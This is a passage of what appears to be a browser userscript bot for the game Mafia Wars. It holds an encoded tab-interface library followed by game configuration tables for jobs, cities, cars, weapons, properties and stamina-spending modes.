    "Z3RoLTENCgkJfQ0KCQlpZiAodHlwZW9mIGF1dG9ydW49PSJ1bmRlZmluZWQiKSAvL2lmIGN5Y2xlaXQoKSBpcyBiZWluZyBjYWxsZWQgYnkgdXNlciwgdmVyc3VzIGF1dG9ydW4oKSBmdW5jdGlvbg0KCQkJdGhp" +
    "cy5jYW5jZWxhdXRvcnVuKCkgLy9zdG9wIGF1dG8gY3ljbGluZyBvZiB0YWJzIChpZiBydW5uaW5nKQ0KCQl0aGlzLmV4cGFuZHRhYih0aGlzLnRhYnNbdGhpcy5ob3R0YWJzcG9zaXRpb25zW2N1cnJlbnRUYWJJ" +
    "bmRleF1dKQ0KCX0sDQoNCglzZXRwZXJzaXN0OmZ1bmN0aW9uKGJvb2wpeyAvL1BVQkxJQyBmdW5jdGlvbiB0byB0b2dnbGUgcGVyc2lzdGVuY2UgZmVhdHVyZQ0KCQkJdGhpcy5lbmFibGV0YWJwZXJzaXN0ZW5j" +
    "ZT1ib29sDQoJfSwNCg0KCXNldHNlbGVjdGVkQ2xhc3NUYXJnZXQ6ZnVuY3Rpb24ob2Jqc3RyKXsgLy9QVUJMSUMgZnVuY3Rpb24gdG8gc2V0IHdoaWNoIHRhcmdldCBlbGVtZW50IHRvIGFzc2lnbiAic2VsZWN0" +
    "ZWQiIENTUyBjbGFzcyAoImxpbmtwYXJlbnQiIG9yICJsaW5rIikNCgkJdGhpcy5zZWxlY3RlZENsYXNzVGFyZ2V0PW9ianN0ciB8fCAibGluayINCgl9LA0KDQoJZ2V0c2VsZWN0ZWRDbGFzc1RhcmdldDpmdW5j" +
    "dGlvbih0YWJyZWYpeyAvL1JldHVybnMgdGFyZ2V0IGVsZW1lbnQgdG8gYXNzaWduICJzZWxlY3RlZCIgQ1NTIGNsYXNzIHRvDQoJCXJldHVybiAodGhpcy5zZWxlY3RlZENsYXNzVGFyZ2V0PT0oImxpbmtwYXJl" +
    "bnQiLnRvTG93ZXJDYXNlKCkpKT8gdGFicmVmLnBhcmVudE5vZGUgOiB0YWJyZWYNCgl9LA0KDQoJdXJscGFyYW1zZWxlY3Q6ZnVuY3Rpb24odGFiaW50ZXJmYWNlaWQpew0KCQl2YXIgcmVzdWx0PXdpbmRvdy5s" +
    "b2NhdGlvbi5zZWFyY2gubWF0Y2gobmV3IFJlZ0V4cCh0YWJpbnRlcmZhY2VpZCsiPShcXGQrKSIsICJpIikpIC8vY2hlY2sgZm9yICI/dGFiaW50ZXJmYWNlaWQ9MiIgaW4gVVJMDQoJCXJldHVybiAocmVzdWx0" +
    "PT1udWxsKT8gbnVsbCA6IHBhcnNlSW50KFJlZ0V4cC4kMSkgLy9yZXR1cm5zIG51bGwgb3IgaW5kZXgsIHdoZXJlIGluZGV4IChpbnQpIGlzIHRoZSBzZWxlY3RlZCB0YWIncyBpbmRleA0KCX0sDQoNCglleHBh" +
    "bmR0YWI6ZnVuY3Rpb24odGFicmVmKXsNCgkJdmFyIHN1YmNvbnRlbnRpZD10YWJyZWYuZ2V0QXR0cmlidXRlKCJyZWwiKSAvL0dldCBpZCBvZiBzdWJjb250ZW50IHRvIGV4cGFuZA0KCQkvL0dldCAicmV2IiBh" +
    "dHRyIGFzIGEgc3RyaW5nIG9mIElEcyBpbiB0aGUgZm9ybWF0ICIsam9obixnZW9yZ2UsdHJleSxldGMsIiB0byBlYXNpbHkgc2VhcmNoIHRocm91Z2gNCgkJdmFyIGFzc29jaWF0ZWRyZXZpZHM9KHRhYnJlZi5n" +
    "ZXRBdHRyaWJ1dGUoInJldiIpKT8gIiwiK3RhYnJlZi5nZXRBdHRyaWJ1dGUoInJldiIpLnJlcGxhY2UoL1xzKy8sICIiKSsiLCIgOiAiIg0KCQl0aGlzLmV4cGFuZHN1YmNvbnRlbnQoc3ViY29udGVudGlkKQ0K" +
    "CQl0aGlzLmV4cGFuZHJldmNvbnRlbnQoYXNzb2NpYXRlZHJldmlkcykNCgkJZm9yICh2YXIgaT0wOyBpPHRoaXMudGFicy5sZW5ndGg7IGkrKyl7IC8vTG9vcCB0aHJvdWdoIGFsbCB0YWJzLCBhbmQgYXNzaWdu" +
    "IG9ubHkgdGhlIHNlbGVjdGVkIHRhYiB0aGUgQ1NTIGNsYXNzICJzZWxlY3RlZCINCgkJCXRoaXMuZ2V0c2VsZWN0ZWRDbGFzc1RhcmdldCh0aGlzLnRhYnNbaV0pLmNsYXNzTmFtZT0odGhpcy50YWJzW2ldLmdl" +
    "dEF0dHJpYnV0ZSgicmVsIik9PXN1YmNvbnRlbnRpZCk/ICJzZWxlY3RlZCIgOiAiIg0KCQl9DQoJCWlmICh0aGlzLmVuYWJsZXRhYnBlcnNpc3RlbmNlKSAvL2lmIHBlcnNpc3RlbmNlIGVuYWJsZWQsIHNhdmUg" +
    "c2VsZWN0ZWQgdGFiIHBvc2l0aW9uKGludCkgcmVsYXRpdmUgdG8gaXRzIHBlZXJzDQoJCQlkZHRhYmNvbnRlbnQuc2V0Q29va2llKHRoaXMudGFiaW50ZXJmYWNlaWQsIHRhYnJlZi50YWJwb3NpdGlvbikNCgkJ" +
    "dGhpcy5zZXRjdXJyZW50dGFiaW5kZXgodGFicmVmLnRhYnBvc2l0aW9uKSAvL3JlbWVtYmVyIHBvc2l0aW9uIG9mIHNlbGVjdGVkIHRhYiB3aXRoaW4gaG90dGFic3Bvc2l0aW9uc1tdIGFycmF5DQoJfSwNCg0K" +
    "CWV4cGFuZHN1YmNvbnRlbnQ6ZnVuY3Rpb24oc3ViY29udGVudGlkKXsNCgkJZm9yICh2YXIgaT0wOyBpPHRoaXMuc3ViY29udGVudGlkcy5sZW5ndGg7IGkrKyl7DQoJCQl2YXIgc3ViY29udGVudD1kb2N1bWVu" +
    "dC5nZXRFbGVtZW50QnlJZCh0aGlzLnN1YmNvbnRlbnRpZHNbaV0pIC8vY2FjaGUgY3VycmVudCBzdWJjb250ZW50IG9iaiAoaW4gZm9yIGxvb3ApDQoJCQlzdWJjb250ZW50LnN0eWxlLmRpc3BsYXk9KHN1YmNv" +
    "bnRlbnQuaWQ9PXN1YmNvbnRlbnRpZCk/ICJibG9jayIgOiAibm9uZSIgLy8ic2hvdyIgb3IgaGlkZSBzdWIgY29udGVudCBiYXNlZCBvbiBtYXRjaGluZyBpZCBhdHRyIHZhbHVlDQoJCX0NCgl9LA0KDQoJZXhw" +
    "YW5kcmV2Y29udGVudDpmdW5jdGlvbihhc3NvY2lhdGVkcmV2aWRzKXsNCgkJdmFyIGFsbHJldmlkcz10aGlzLnJldmNvbnRlbnRpZHMNCgkJZm9yICh2YXIgaT0wOyBpPGFsbHJldmlkcy5sZW5ndGg7IGkrKyl7" +
    "IC8vTG9vcCB0aHJvdWdoIHJldiBhdHRyaWJ1dGVzIGZvciBhbGwgdGFicyBpbiB0aGlzIHRhYiBpbnRlcmZhY2UNCgkJCS8vaWYgYW55IHZhbHVlcyBzdG9yZWQgd2l0aGluIGFzc29jaWF0ZWRyZXZpZHMgbWF0" +
    "Y2hlcyBvbmUgd2l0aGluIGFsbHJldmlkcywgZXhwYW5kIHRoYXQgRElWLCBvdGhlcndpc2UsIGNvbnRyYWN0IGl0DQoJCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZChhbGxyZXZpZHNbaV0pLnN0eWxlLmRpc3Bs" +
    "YXk9KGFzc29jaWF0ZWRyZXZpZHMuaW5kZXhPZigiLCIrYWxscmV2aWRzW2ldKyIsIikhPS0xKT8gImJsb2NrIiA6ICJub25lIg0KCQl9DQoJfSwNCg0KCXNldGN1cnJlbnR0YWJpbmRleDpmdW5jdGlvbih0YWJw" +
    "b3NpdGlvbil7IC8vc3RvcmUgY3VycmVudCBwb3NpdGlvbiBvZiB0YWIgKHdpdGhpbiBob3R0YWJzcG9zaXRpb25zW10gYXJyYXkpDQoJCWZvciAodmFyIGk9MDsgaTx0aGlzLmhvdHRhYnNwb3NpdGlvbnMubGVu" +
    "Z3RoOyBpKyspew0KCQkJaWYgKHRhYnBvc2l0aW9uPT10aGlzLmhvdHRhYnNwb3NpdGlvbnNbaV0pew0KCQkJCXRoaXMuY3VycmVudFRhYkluZGV4PWkNCgkJCQlicmVhaw0KCQkJfQ0KCQl9DQoJfSwNCg0KCWF1" +
    "dG9ydW46ZnVuY3Rpb24oKXsgLy9mdW5jdGlvbiB0byBhdXRvIGN5Y2xlIHRocm91Z2ggYW5kIHNlbGVjdCB0YWJzIGJhc2VkIG9uIGEgc2V0IGludGVydmFsDQoJCXRoaXMuY3ljbGVpdCgnbmV4dCcsIHRydWUp" +
    "DQoJfSwNCg0KCWNhbmNlbGF1dG9ydW46ZnVuY3Rpb24oKXsNCgkJaWYgKHR5cGVvZiB0aGlzLmF1dG9ydW50aW1lciE9InVuZGVmaW5lZCIpDQoJCQljbGVhckludGVydmFsKHRoaXMuYXV0b3J1bnRpbWVyKQ0K" +
    "CX0sDQoNCglpbml0OmZ1bmN0aW9uKGF1dG9tb2RlcGVyaW9kKXsNCgkJdmFyIHBlcnNpc3RlZHRhYj1kZHRhYmNvbnRlbnQuZ2V0Q29va2llKHRoaXMudGFiaW50ZXJmYWNlaWQpIC8vZ2V0IHBvc2l0aW9uIG9m" +
    "IHBlcnNpc3RlZCB0YWIgKGFwcGxpY2FibGUgaWYgcGVyc2lzdGVuY2UgaXMgZW5hYmxlZCkNCgkJdmFyIHNlbGVjdGVkdGFiPS0xIC8vQ3VycmVudGx5IHNlbGVjdGVkIHRhYiBpbmRleCAoLTEgbWVhbmluZyBu" +
    "b25lKQ0KCQl2YXIgc2VsZWN0ZWR0YWJmcm9tdXJsPXRoaXMudXJscGFyYW1zZWxlY3QodGhpcy50YWJpbnRlcmZhY2VpZCkgLy9yZXR1cm5zIG51bGwgb3IgaW5kZXggZnJvbTogdGFiY29udGVudC5odG0/dGFi" +
    "aW50ZXJmYWNlaWQ9aW5kZXgNCgkJdGhpcy5hdXRvbW9kZXBlcmlvZD1hdXRvbW9kZXBlcmlvZCB8fCAwDQoJCWZvciAodmFyIGk9MDsgaTx0aGlzLnRhYnMubGVuZ3RoOyBpKyspew0KCQkJdGhpcy50YWJzW2ld" +
    "LnRhYnBvc2l0aW9uPWkgLy9yZW1lbWJlciBwb3NpdGlvbiBvZiB0YWIgcmVsYXRpdmUgdG8gaXRzIHBlZXJzDQoJCQlpZiAodGhpcy50YWJzW2ldLmdldEF0dHJpYnV0ZSgicmVsIikpew0KCQkJCXZhciB0YWJp" +
    "bnN0YW5jZT10aGlzDQoJCQkJdGhpcy5ob3R0YWJzcG9zaXRpb25zW3RoaXMuaG90dGFic3Bvc2l0aW9ucy5sZW5ndGhdPWkgLy9zdG9yZSBwb3NpdGlvbiBvZiAiaG90IiB0YWIgKCJyZWwiIGF0dHIgZGVmaW5l" +
    "ZCkgcmVsYXRpdmUgdG8gaXRzIHBlZXJzDQoJCQkJdGhpcy5zdWJjb250ZW50aWRzW3RoaXMuc3ViY29udGVudGlkcy5sZW5ndGhdPXRoaXMudGFic1tpXS5nZXRBdHRyaWJ1dGUoInJlbCIpIC8vc3RvcmUgaWQg" +
    "b2Ygc3ViIGNvbnRlbnQgKCJyZWwiIGF0dHIgdmFsdWUpDQoJCQkJdGhpcy50YWJzW2ldLm9uY2xpY2s9ZnVuY3Rpb24oKXsNCgkJCQkJdGFiaW5zdGFuY2UuZXhwYW5kdGFiKHRoaXMpDQoJCQkJCXRhYmluc3Rh" +
    "bmNlLmNhbmNlbGF1dG9ydW4oKSAvL3N0b3AgYXV0byBjeWNsaW5nIG9mIHRhYnMgKGlmIHJ1bm5pbmcpDQoJCQkJCXJldHVybiBmYWxzZQ0KCQkJCX0NCgkJCQlpZiAodGhpcy50YWJzW2ldLmdldEF0dHJpYnV0" +
    "ZSgicmV2IikpeyAvL2lmICJyZXYiIGF0dHIgZGVmaW5lZCwgc3RvcmUgZWFjaCB2YWx1ZSB3aXRoaW4gInJldiIgYXMgYW4gYXJyYXkgZWxlbWVudA0KCQkJCQl0aGlzLnJldmNvbnRlbnRpZHM9dGhpcy5yZXZj" +
    "b250ZW50aWRzLmNvbmNhdCh0aGlzLnRhYnNbaV0uZ2V0QXR0cmlidXRlKCJyZXYiKS5zcGxpdCgvXHMqLFxzKi8pKQ0KCQkJCX0NCgkJCQlpZiAoc2VsZWN0ZWR0YWJmcm9tdXJsPT1pIHx8IHRoaXMuZW5hYmxl" +
    "dGFicGVyc2lzdGVuY2UgJiYgc2VsZWN0ZWR0YWI9PS0xICYmIHBhcnNlSW50KHBlcnNpc3RlZHRhYik9PWkgfHwgIXRoaXMuZW5hYmxldGFicGVyc2lzdGVuY2UgJiYgc2VsZWN0ZWR0YWI9PS0xICYmIHRoaXMu" +
    "Z2V0c2VsZWN0ZWRDbGFzc1RhcmdldCh0aGlzLnRhYnNbaV0pLmNsYXNzTmFtZT09InNlbGVjdGVkIil7DQoJCQkJCXNlbGVjdGVkdGFiPWkgLy9TZWxlY3RlZCB0YWIgaW5kZXgsIGlmIGZvdW5kDQoJCQkJfQ0K" +
    "CQkJfQ0KCQl9IC8vRU5EIGZvciBsb29wDQoJCWlmIChzZWxlY3RlZHRhYiE9LTEpIC8vaWYgYSB2YWxpZCBkZWZhdWx0IHNlbGVjdGVkIHRhYiBpbmRleCBpcyBmb3VuZA0KCQkJdGhpcy5leHBhbmR0YWIodGhp" +
    "cy50YWJzW3NlbGVjdGVkdGFiXSkgLy9leHBhbmQgc2VsZWN0ZWQgdGFiIChlaXRoZXIgZnJvbSBVUkwgcGFyYW1ldGVyLCBwZXJzaXN0ZW50IGZlYXR1cmUsIG9yIGNsYXNzPSJzZWxlY3RlZCIgY2xhc3MpDQoJ" +
    "CWVsc2UgLy9pZiBubyB2YWxpZCBkZWZhdWx0IHNlbGVjdGVkIGluZGV4IGZvdW5kDQoJCQl0aGlzLmV4cGFuZHRhYih0aGlzLnRhYnNbdGhpcy5ob3R0YWJzcG9zaXRpb25zWzBdXSkgLy9KdXN0IHNlbGVjdCBm" +
    "aXJzdCB0YWIgdGhhdCBjb250YWlucyBhICJyZWwiIGF0dHINCgkJaWYgKHBhcnNlSW50KHRoaXMuYXV0b21vZGVwZXJpb2QpPjUwMCAmJiB0aGlzLmhvdHRhYnNwb3NpdGlvbnMubGVuZ3RoPjEpew0KCQkJdGhp" +
    "cy5hdXRvcnVudGltZXI9c2V0SW50ZXJ2YWwoZnVuY3Rpb24oKXt0YWJpbnN0YW5jZS5hdXRvcnVuKCl9LCB0aGlzLmF1dG9tb2RlcGVyaW9kKQ0KCQl9DQoJfSAvL0VORCBpbnQoKSBmdW5jdGlvbg0KDQp9IC8v" +
    "RU5EIFByb3RvdHlwZSBhc3NpZ25tZW50";

  var settingsOpen = false;
  var statsOpen = false;
  var scratchpad = document.createElement('textarea');
  var defaultClans = ['{', '[', '(', '<', '\u25C4', '�', '\u2122', '\u03A8', '\u039E'];
  var defaultPassPatterns = ['LOST', 'punched', 'Whacked', 'you were robbed', 'ticket'];
  var defaultFailPatterns = ['WON','heal','help','properties','upgraded'];
  var keyStr = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';

  var debug = isGMChecked('enableDebug');
  var filter = isGMChecked('filterLog');

  // Regular expression for cash matching.
  const REGEX_CASH = /[A-Z]?\$[\d,]*\d/;

  // Define how stamina can be used.
  const STAMINA_HOW_FIGHT_RANDOM = 0;  // Random fighting.
  const STAMINA_HOW_FIGHT_LIST   = 1;  // List fighting.
  const STAMINA_HOW_HITMAN       = 2;  // Hitman.
  const STAMINA_HOW_ROBBING      = 3;  // Robbing
  const STAMINA_HOW_AUTOHITLIST  = 4;  // Place bounties.
  const STAMINA_HOW_RANDOM       = 5;  // Random spending of stamina in random cities.
  const STAMINA_HOW_FIGHTROB     = 6;  // Fight then Rob random opponents.

  var staminaSpendChoices = [];
  staminaSpendChoices[STAMINA_HOW_FIGHT_RANDOM] = 'Fight random opponents';
  staminaSpendChoices[STAMINA_HOW_FIGHT_LIST]   = 'Fight specific opponents';
  staminaSpendChoices[STAMINA_HOW_HITMAN]       = 'Collect hitlist bounties';
  staminaSpendChoices[STAMINA_HOW_ROBBING]      = 'Rob random opponents';
  staminaSpendChoices[STAMINA_HOW_AUTOHITLIST]  = 'Place hitlist bounties';
  staminaSpendChoices[STAMINA_HOW_RANDOM]       = 'Spend stamina randomly';
  staminaSpendChoices[STAMINA_HOW_FIGHTROB]     = 'Fight then Rob';

  var randomSpendChoices = [];
  randomSpendChoices[STAMINA_HOW_FIGHT_RANDOM] = 'Fight random';
  randomSpendChoices[STAMINA_HOW_FIGHT_LIST]   = 'Fight specific';
  randomSpendChoices[STAMINA_HOW_HITMAN]       = 'Collect bounties';
  randomSpendChoices[STAMINA_HOW_ROBBING]      = 'Rob random';

  // Define Bounty Selection options
  const BOUNTY_SHORTEST_TIME  = 0;  // Select qualified bounties with shortest time.
  const BOUNTY_LONGEST_TIME   = 1;  // Select qualified bounties with longest time on the hitlist.
  const BOUNTY_HIGHEST_BOUNTY = 2;  // Select qualified bounties with the highest bounty.
  const BOUNTY_EXACT_AMOUNT   = 3;  // Select qualified bounties with exact dollar amount.
  const BOUNTY_RANDOM         = 4;  // Select random qualified bounty.
  var bountySelectionChoices = [];
  bountySelectionChoices[BOUNTY_SHORTEST_TIME]  = 'Shortest time';
  bountySelectionChoices[BOUNTY_LONGEST_TIME]   = 'Longest time';
  bountySelectionChoices[BOUNTY_HIGHEST_BOUNTY] = 'Highest bounty';
  bountySelectionChoices[BOUNTY_EXACT_AMOUNT]   = 'Exact dollar amount';
  bountySelectionChoices[BOUNTY_RANDOM]         = 'No preference (random)';

  // Define war modes
  const WAR_HOW_RANDOM = 0;  // Random war.
  const WAR_HOW_LIST   = 1;  // List warring
  var warModeChoices = ['War a random friend', 'War friends from a list'];

  // Define AutoStat allocation mode
  const AUTOSTAT_TARGET        = 0;
  const AUTOSTAT_RATIO_LEVEL   = 1;
  const AUTOSTAT_RATIO_ATTACK  = 2;
  const AUTOSTAT_RATIO_DEFENSE = 3;
  const AUTOSTAT_RATIO_HEALTH  = 4;
  const AUTOSTAT_RATIO_ENERGY  = 5;
  const AUTOSTAT_RATIO_STAMINA = 6;

  // Auto Stat mode arrays
  var autoStatDescrips  = ['Level', 'Attack', 'Defense', 'Health', 'Energy', 'Stamina'];
  var autoStatModes     = ['autoStatAttackMode', 'autoStatDefenseMode', 'autoStatHealthMode',
                           'autoStatEnergyMode', 'autoStatStaminaMode'];
  var autoStatPrios     = ['autoStatAttackPrio', 'autoStatDefensePrio', 'autoStatHealthPrio',
                           'autoStatEnergyPrio', 'autoStatStaminaPrio'];
  var autoStatFallbacks = ['autoStatAttackFallback', 'autoStatDefenseFallback', 'autoStatHealthFallback',
                           'autoStatEnergyFallback', 'autoStatStaminaFallback'];
  var autoStatBases     = ['autoStatAttackBase', 'autoStatDefenseBase', 'autoStatHealthBase',
                           'autoStatEnergyBase', 'autoStatStaminaBase'];
  var autoStatRatios    = ['autoStatAttackRatio', 'autoStatDefenseRatio', 'autoStatHealthRatio',
                           'autoStatEnergyRatio', 'autoStatStaminaRatio'];

  // Number Scheme
  const SCHEME_PERCENT = 0;
  const SCHEME_POINTS = 1;

  var numberSchemes = ['percent','points'];

  // Stamina Burst constants
  const BURST_WIN    = 0;
  const BURST_ALWAYS = 1;
  var burstModes = ['ONLY if won','ALWAYS'];

  // Burn constants
  const BURN_ENERGY = 0;
  const BURN_STAMINA = 1;
  var burnModes = ['Energy','Stamina'];

  // Array of lottery bonus items
  var autoLottoBonusList = ['A random collection item', 'A free ticket', '+5 stamina points', '1 Godfather point', '+20 energy points', '1-5 Godfather points'];

  // Prop Income
  var propsData = new Array (
    // Name, income per level per hour
    ['Louie\'s Deli', 250],
    ['Flophouse', 300],
    ['Pawnshop', 700],
    ['Tenement', 5000],
    ['Warehouse', 10000],
    ['Restaurant', 12000],
    ['Dockyard', 50000],
    ['Office Park', 150000],
    ['Uptown Hotel', 200000],
    ['Mega Casino', 300000]
// close above and open below to trick script into buying casino's
//    ['Mega Casino',   300000000]
  );

  // Stat Ordinal constants
  const ATTACK_STAT  = 0;
  const DEFENSE_STAT = 1;
  const HEALTH_STAT  = 2;
  const ENERGY_STAT  = 3;
  const STAMINA_STAT = 4;

  // Define city variables.
  const NY      = 0;
  const CUBA    = 1;
  const MOSCOW  = 2;
  const BANGKOK = 3;
  const LV      = 4;
  const ACTIVE_CITY = 5;
  const RANDOM_CITY = 6;

  // Constants to access city attributes
  const CITY_NAME        = 0;
  const CITY_ALIAS       = 1;
  const CITY_SIDES       = 2;
  const CITY_SIDE_NAME   = 3;
  const CITY_CASH        = 4;
  const CITY_LEVEL       = 5;
  const CITY_CASH_ICON   = 6;
  const CITY_CASH_CSS    = 7;
  const CITY_AUTOBANK    = 8;
  const CITY_BANKCONFG   = 9;
  const CITY_CASH_SYMBOL = 10;
  const CITY_ALLIANCE    = 11;

  // Constants for accessing mission array
  const MISSION_NAME     = 0; // 7
  const MISSION_ENERGY   = 1; // 5
  const MISSION_NUMBER   = 2; // 4
  const MISSION_TAB      = 3; // 2
  const MISSION_CITY     = 4; // 1
  const MISSION_XP       = 5; // 6
  const MISSION_TABPATH  = 6; // 3
  const MISSION_NODE_LV  = 7; // 0 node line for Las Vegas
  const MISSION_RATIO    = 8; // 8

  // Add city variables in this format
  // Name, Alias, Sides (if any), Cash, Level Req, Icon, Icon CSS, Autobank config, Min cash config, Sell Crates config, Cash Symbol, Alliance Point Threshold
  // Array container for city variables
  var cities = new Array(
    ['New York', 'nyc', [], 'sideNY', undefined, 0, cashIcon, 'cash Icon', 'autoBank', 'bankConfig', '$', 0],
    ['Cuba', 'cuba', [], 'sideCuba', undefined, 35, cashCubaIcon, 'cashCuba Icon', 'autoBankCuba', 'bankConfigCuba', 'C$', 0],
    ['Moscow', 'moscow', ['Vory','Mafiya'], 'sideMoscow', undefined, 70, cashMoscowIcon, 'cashMoscow Icon', 'autoBankMoscow', 'bankConfigMoscow', 'R$', 0],
    ['Bangkok', 'bangkok', ['Yakuza','Triad'], 'sideBangkok', undefined, 18, cashBangkokIcon, 'cashBangkok Icon', 'autoBankBangkok', 'bankConfigBangkok', 'B$', 50],
    ['Las Vegas', 'vegas', [], 'sideVegas', undefined, 0, cashVegasIcon, 'cashVegas Icon', 'autoBankVegas', 'bankConfigVegas', 'V$', 0]
  );

  var locations = ['New York','Cuba','Moscow','Bangkok','Las Vegas','Active City'];
  var fightLocations = ['New York','Cuba','Moscow','Bangkok','Las Vegas','Active City', 'Random City'];
  var randomLocations = ['New York','Cuba','Moscow','Bangkok','Las Vegas'];

  // Featured job locations
  var featJobNames = ['Left Job', 'Middle Job', 'Right Job'];

  var allyFaction = '';
  var quickBankFail = false;

  // Cars
  var cityCars = new Array (
    ['Sonic Five', 25, 'Requires 12 car parts | 32 attack, 30 defense'],
    ['Random Common Car', 1, 'Requires 10 car parts'],
    ['General Ulysses', 26, 'Requires 28 car parts| 38 attack, 28 defense'],
    ['Random Rare Car', 2, 'Requires 25 car parts'],
    ['Tasmanian', 3, 'Requires 30 car parts | 36 attack, 34 defense'],
    ['CM Santiago R10', 4, 'Requires 30 car parts, 2 cuban car parts | 42 attack, 30 defense'],
    ['Sirroco 9Z', 11, 'Requires 48 car parts | 46 attack, 15 defense'],
    ['Rebel 2', 5, 'Requires 45 car parts, 1 bulletproof glass | 40 attack, 45 defense, +5 stamina'],
    ['Russian Dazatz 45', 6, 'Requires 50 car parts, 2 russian car parts | 18 attack, 46 defense'],
    ['Solar Flare', 7, 'Requires 65 car parts, 1 solar panel | 34 attack, 34 defense, +5 energy'],
    ['Andresen 420si', 12, 'Requires 68 car parts | 41 attack, 43 defense'],
    ['Thai XS Max', 8, 'Requires 75 car parts, 2 Thai car parts | 45 attack, 35 defense'],
    ['Trio Napoli', 9, 'Requires 95 car parts | 47 attack, 23 defense'],
    ['Red Angel', 10, 'Requires 115 car parts | 16 attack, 49 defense'],
    ['Mugati Sport', 13, 'Requires 135 car parts, 1 high tech car part | 35 attack, 51 defense, +3 attack'],
    ['Hunter \'Spy\' XS', 14, 'Requires 155 car parts, 2 high tech car parts | 52 attack, 29 defense, +3 defense'],
    ['Day Rider 2K', 27, 'Requires 175 car parts, 1 suspension coil | 45 attack, 50 defense, +1 attack, +1 defense']
  );

  // Weapons build
  var cityWeapons = new Array (
    ['Random Common Weapon', 15, 'Requires 1 weapon parts'],
    ['Random Uncommon Weapon', 16, 'Requires 3 weapon parts'],
    ['Random Rare Weapon', 17, 'Requires 5 weapon parts'],
    ['Ninja Sai', 18, 'Requires 30 weapon parts | 30 attack, 40 defense'],
    ['First Blood', 19, 'Requires 8 weapon parts and 1 explosive arrow | 49 attack, 13 defense'],
    ['Ultrasonic Gun', 20, 'Requires 12 weapon parts and 1 sonic emitter | 22 attack, 48 defense'],
    ['Lazer Guided RPG', 21, 'Requires 21 weapon parts and 1 laser rangefinder | 37 attack, 42 defense'],
    ['Robber\'s Utility Belt', 22, 'Requires 24 weapon parts, 1 boomerang and 1 grapple | 33 attack, 41 defense, +6 stamina'],
    ['Railgun', 23, 'Requires 27 weapon parts and 1 railgun barrel | 51 attack, 24 defense, +5 attack'],
    ['Plasma Rifle', 24, 'Requires 55 weapon parts and 1 portable fusion reactor | 40 attack, 47 defense, +5 defense']
  );

  // Las Vegas vault levels
  var vaultLevels = new Array (
    ['Vault handling disabled', 0],
    ['0.5 stars (V$100,000)', 100000],
    ['1.0 stars (V$200,000)', 200000],
    ['1.5 stars (V$400,000)', 400000],
    ['2.0 stars (V$800,000)', 800000],
    ['2.5 stars (V$1,500,000)', 1500000],
    ['3.0 stars (V$3,000,000)', 3000000],
    ['3.5 stars (V$5,000,000)', 5000000],
    ['4.0 stars (V$10,000,000)', 10000000],
    ['4.5 stars (V$20,000,000)', 20000000],
    ['5.0 stars (V$50,000,000)', 50000000]
  );

  // Flash Check
  const FLASH_UNDEFINED = -1;
  const FLASH_ENABLED = 1;
  const FLASH_DISABLED = 0;
  var isFlashed = FLASH_UNDEFINED;

  // Gift Accept Choices/Rewards
  var giftAcceptChoices = ['Help', 'Sabotage'];
  var giftAcceptRewards = ['XP', 'Energy', 'Stamina'];

  // Spend objects
  var SpendStamina = new Spend ('Stamina', 'staminaSpend', 'useStaminaStarted',
                                'selectStaminaKeepMode', 'selectStaminaKeep',
                                'selectStaminaUseMode', 'selectStaminaUse', staminaIcon,
                                'allowStaminaToLevelUp', 'staminaFloorLast', 'staminaCeilingLast');
  var SpendEnergy  = new Spend ('Energy', 'autoMission', 'useEnergyStarted',
                                'selectEnergyKeepMode', 'selectEnergyKeep',
                                'selectEnergyUseMode', 'selectEnergyUse', energyIcon,
                                'allowEnergyToLevelUp', 'energyFloorLast', 'energyCeilingLast');

  // Force Heal options
  var healOptions = new Array(
    ['forceHealOpt7','Heal if Health is above 19','check to allow healing while health is above 19, Overrides ALL Lower Settings'],
    ['forceHealOpt5','Heal after 5 minutes','if health drops below 20, start a 5 minute timer, Then allow healing'],
    ['forceHealOpt4','Heal if stamina is full','allow healing if stamina is full and not blocked from above choices'],
    ['forceHealOpt3','Heal if stamina can be spent','try to heal. overridden by the top 2 choices']
  );

  // Define all jobs. The array elements are:
  // job description0, energy cost1, job number2, tab number3, city4, exp payout5, tabpath6, lvnode7, ratio8
  var missions = new Array(
//     7                                                    5   4 2    1      6 3    0     8 //
    ['Chase Away Thugs'                                  ,  1,  1,1,NY     ,  1,0,'     '],
    ['Rob a Drug Runner'                                 ,  3,  2,1,NY     ,  3,0,'     '],
    ['Rough Up Dealers'                                  ,  5,  3,1,NY     ,  5,0,'     '],
    ['Rob the Warehouse'                                 ,  7,  4,1,NY     ,  8,0,'     '],
    ['Collect Protection Money'                          ,  2,  5,1,NY     ,  2,0,'     '],
    ['Grow Your Family'                                  ,  3,  8,1,NY     ,  3,0,'     '],
    ['Perform a Hit'                                     ,  2, 37,1,NY     ,  2,0,'     '],
    ['Mugging'                                           ,  2,  6,2,NY     ,  2,0,'     '],
    ['Auto Theft'                                        ,  2,  7,2,NY     ,  2,0,'     '],
    ['Take Out a Rogue Cop'                              ,  3,  9,2,NY     ,  3,0,'     '],
    ['Collect on a Loan'                                 ,  3, 10,2,NY     ,  3,0,'     '],
    ['Bank Heist'                                        , 10, 11,2,NY     , 13,0,'     '],
    ['Jewelry Store Job'                                 , 15, 12,2,NY     , 20,0,'     '],
    ['Hijack a Semi'                                     ,  8, 38,2,NY     ,  9,0,'     '],
    ['Destroy Enemy Mob Hideout'                         ,  5, 13,3,NY     ,  5,0,'     '],
    ['Kill a Protected Snitch'                           ,  5, 14,3,NY     ,  5,0,'     '],
    ['Bust a Made Man Out of Prison'                     ,  5, 15,3,NY     ,  5,0,'     '],
    ['Asian Museum Break-in'                             , 18, 16,3,NY     , 22,0,'     '],
    ['Fight a Haitian Gang'                              ,  6, 17,3,NY     ,  6,0,'     '],
    ['Clip the Irish Mob\'s Local Enforcer'              , 10, 39,3,NY     , 11,0,'     '],
    ['Steal a Tanker Truck'                              ,  8, 40,3,NY     ,  9,0,'     '],
    ['Federal Reserve Raid'                              , 25, 18,4,NY     , 30,0,'     '],
    ['Smuggle Thai Gems'                                 ,  7, 19,4,NY     ,  8,0,'     '],
    ['Liquor Smuggling'                                  , 30, 22,4,NY     , 35,0,'     '],
    ['Run Illegal Poker Game'                            , 20, 26,4,NY     , 33,0,'     '],
    ['Wiretap the Cops'                                  , 30, 28,4,NY     , 45,0,'     '],
    ['Rob an Electronics Store'                          , 24, 41,4,NY     , 26,0,'     '],
    ['Burn Down a Tenement'                              , 18, 42,4,NY     , 22,0,'     '],
